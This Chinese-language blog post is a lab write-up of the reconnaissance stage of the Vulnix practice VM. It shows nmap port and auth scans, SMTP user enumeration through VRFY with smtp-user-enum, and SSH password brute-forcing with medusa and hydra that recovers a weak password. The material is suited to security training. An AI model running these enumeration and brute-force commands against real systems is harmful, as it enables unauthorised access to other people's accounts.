<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFS网络文件系统</title>
    <style type="text/css" media="all">
      body {
        margin: 0;
        font-family: "Helvetica Neue", Helvetica, Arial, "Hiragino Sans GB", sans-serif;
        font-size: 14px;
        line-height: 20px;
        color: #777;
        background-color: white;
      }
      .container {
        width: 700px;
        margin-right: auto;
        margin-left: auto;
      }

      .post {
        font-family: Georgia, "Times New Roman", Times, "SimSun", serif;
        position: relative;
        padding: 70px;
        bottom: 0;
        overflow-y: auto;
        font-size: 16px;
        font-weight: normal;
        line-height: 25px;
        color: #515151;
      }

      .post h1{
        font-size: 50px;
        font-weight: 500;
        line-height: 60px;
        margin-bottom: 40px;
        color: inherit;
      }

      .post p {
        margin: 0 0 35px 0;
      }

      .post img {
        border: 1px solid #D9D9D9;
      }

      .post a {
        color: #28A1C5;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="post">
        <h1 class="title">NFS网络文件系统</h1>
        <div class="show-content">
          <h1>HackLAB: Vulnix第一关（侦察）<br>
</h1><p><a href="https://www.rebootuser.com/?p=933" target="_blank">下载地址</a>,<a href="https://medium.com/@Kan1shka9/hacklab-vulnix-walkthrough-b2b71534c0eb" target="_blank">writeup</a></p><blockquote>
<p>nmap 192.168.1.109 -Pn -sV</p>
<p>22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (<b>Ubuntu Linux</b>; protocol 2.0)</p>
<p><b>25/tcp   open  smtp       Postfix smtpd</b></p>
<p>79/tcp   open  finger     Linux fingerd</p>
<p>110/tcp  open  pop3?</p>
<p>111/tcp  open  rpcbind    2-4 (RPC #100000)</p>
<p>143/tcp  open  imap       Dovecot imapd</p>
<p>512/tcp  open  exec       netkit-rsh rexecd</p>
<p>513/tcp  open  login      OpenBSD or Solaris rlogind</p>
<p>514/tcp  open  tcpwrapped</p>
<p>993/tcp  open  ssl/imap   Dovecot imapd</p>
<p>995/tcp  open  ssl/pop3s?</p>
<p><b>2049/tcp open  nfs_acl</b>    2-3 (RPC #100227)</p>
</blockquote><p>分析：该主机开放了简单邮件服务（端口25，SMTP）、NFS (Network FileSystem)网络文件系统，看来该主机提供了多种服务，不过这种开放端口只怕只有进了内网才有。系统版本Linux 2.6.32 - 3.10</p><p>先用medusa爆破，先跑着字典，也不碍事。然后探测有没有服务的漏洞。<a href="https://wiki.skullsecurity.org/Passwords" target="_blank">字典下载地址</a></p><blockquote><p>medusa -h 192.168.1.109 -U /root/Desktop/john.txt -P /root/Desktop/pass.txt -e ns -M ssh -t 10 -O ssh.log</p></blockquote><p>经过一段时间，爆破效果不佳。</p><h1>检查弱口令：</h1><blockquote><p>nmap --script=auth 192.168.1.109</p></blockquote><blockquote>
<p>22/tcp   open  ssh</p>
<p>| ssh-auth-methods:</p>
<p><b>|   Supported authentication methods:  支持的验证方式：<a href="http://blog.csdn.net/zoucui/article/details/6135078" target="_blank">publickey</a>，password。后一种是传统的验证方式</b></p>
<p><b>|     publickey</b></p>
<p><b>|_    password</b></p>
<p>|_ssh-publickey-acceptance: ERROR: Script execution failed (use -d to debug)</p>
<p>25/tcp   open  smtp</p>
<p>| smtp-enum-users:</p>
<p><b>|_  Method RCPT returned a unhandled status code.</b></p>
</blockquote><h1>SMTP简单邮件传输协议：</h1><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-87d35feefd490a45.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption">摘自《堆栈攻击：八层网络安全防御》</div>
</div><blockquote>
<p>nmap有个脚本，枚举存在的用户名。<a href="https://nmap.org/nsedoc/scripts/smtp-enum-users.html" target="_blank">https://nmap.org/nsedoc/scripts/smtp-enum-users.html</a></p>
<p>nmap --script smtp-enum-users.nse -p 25 192.168.1.109</p>
<p>结果：Couldn't find any accounts</p>
<p>

nmap --script-args smtp-enum-users.methods={EXPN,RCPT,VRFY} -p 25 192.168.1.109</p>
<p>结果2：Failed to resolve "smtp-enum-users.methods=RCPT".</p>
<p>            Failed to resolve "smtp-enum-users.methods=VRFY".
Nmap scan report for 192.168.1.109</p>
</blockquote><p>命令分析：</p><p>smtp提供了一个额外的功能，通过命令来检查用户名或额外的邮件列表。使用的是 VRFY and EXPN commands。</p><p>VRFY命令，能够检测系统上是否存在特定的邮件账户。如果服务器能够接受该命令，那么就可能遭受暴力枚举攻击。</p><p><a href="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" target="_blank">枚举smtp用户工具</a></p><blockquote><p>smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.1.109</p></blockquote><blockquote>
<p>枚举结果：</p>
<p>192.168.1.109: ROOT exists</p>
<p>192.168.1.109: backup exists</p>
<p>192.168.1.109: bin exists</p>
<p>192.168.1.109: daemon exists</p>
<p>192.168.1.109: games exists</p>
<p>192.168.1.109: gnats exists</p>
<p>192.168.1.109: irc exists</p>
<p>192.168.1.109: libuuid exists</p>
<p>192.168.1.109: list exists</p>
<p>192.168.1.109: lp exists</p>
<p>192.168.1.109: mail exists</p>
<p>192.168.1.109: man exists</p>
<p>192.168.1.109: messagebus exists</p>
<p>192.168.1.109: news exists</p>
<p>192.168.1.109: nobody exists</p>
<p>192.168.1.109: postmaster exists</p>
<p>192.168.1.109: proxy exists</p>
<p>192.168.1.109: root exists</p>
<p>192.168.1.109: sshd exists</p>
<p>192.168.1.109: sync exists</p>
<p>192.168.1.109: sys exists</p>
<p>192.168.1.109: syslog exists</p>
<p>192.168.1.109: user exists</p>
<p>192.168.1.109: uucp exists</p>
<p>192.168.1.109: www-data exists</p>
</blockquote><h1>结果验证：</h1><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-0a6f89adddf3f7fa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>用VRFY命令验证：如果用户存在，那么显示252，如果用户不存在，显示550。</p><h1>ssh爆破：</h1><p>爆破其实就是一个字典+运气的问题，在这里我作弊了，em.............不作弊的话，应该将搜集到的所有用户名加入到一个字典里。</p><blockquote><p>hydra -l user -P /root/Desktop/pass.txt 192.168.1.109 ssh -t 4</p></blockquote><blockquote>
<p>结果：[DATA] attacking ssh://192.168.1.109:22/</p>
<p>[22][ssh] host: 192.168.1.109   login: user   password: <b>letmein</b></p>
<p>1 of 1 target successfully completed, 1 valid password found</p>
</blockquote><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/2883590-93b2cde8083c3872.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p><a href="https://www.jianshu.com/p/af9132c8a268" target="_blank">下篇：https://www.jianshu.com/p/af9132c8a268</a></p>
        </div>
      </div>
    </div>
  </body>
</html>
